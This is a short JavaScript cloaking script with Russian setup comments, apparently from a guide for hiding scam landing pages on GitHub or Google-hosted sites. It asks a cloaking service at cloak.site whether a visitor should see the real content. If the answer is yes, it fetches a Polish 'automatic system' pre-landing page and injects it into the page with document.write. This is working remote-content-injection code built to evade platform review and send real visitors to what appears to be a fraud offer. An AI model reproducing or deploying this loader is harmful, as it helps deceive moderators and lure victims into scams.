var binomCampaingKey = 's15yun0z67b7t9btickt'; /*GitHub Test, id:158. Key кампании в Binom. Не ID! Узнать key нужной кампании можно в настройках этой кампании. Вот здесь - http://prntscr.com/qua54o  */
var landingUrl = 'https://serd.site/landing/s_p_m/poland/blog-powodzenia.php'; /*Адрес преленда, который необходимо подгрузить*/
var gitHubId = 'findyourways'; /*ID созданного в первой части гайда Google-сайта. Только ID, не вся ссылка!*/
var moneyPageUrl = 'https://lo.blog-powodzenia.biz/automatycznysystem.php/'; /*Адрес манипейдж, который будет подставлен в ссылки на преленде*/
var landingLoadingId = '7m3fx3qa9r1cgejf2iox';

/* БОЛЬШЕ НИЧЕГО НЕ МЕНЯТЬ!*/

var landing = landingUrl + '?mpurl=' + moneyPageUrl + '&githubid=' + gitHubId + '&landingloadingid=' + landingLoadingId; 

var url = 'https://cloak.site/binom/?bckey='+binomCampaingKey;
var xhr = new XMLHttpRequest();
var cloakResult = 'no';

xhr.open('GET', url, false);
xhr.send();

if (xhr.status == 200) {
  cloakResult = xhr.responseText;
} 

if(cloakResult=="yes"){
var xhrLand = new XMLHttpRequest();
var landingCode = '';

xhrLand.open('GET', landing, false);
xhrLand.send();

if (xhrLand.status == 200) {
  landingCode = xhrLand.responseText;
} 

document.write(landingCode);

}
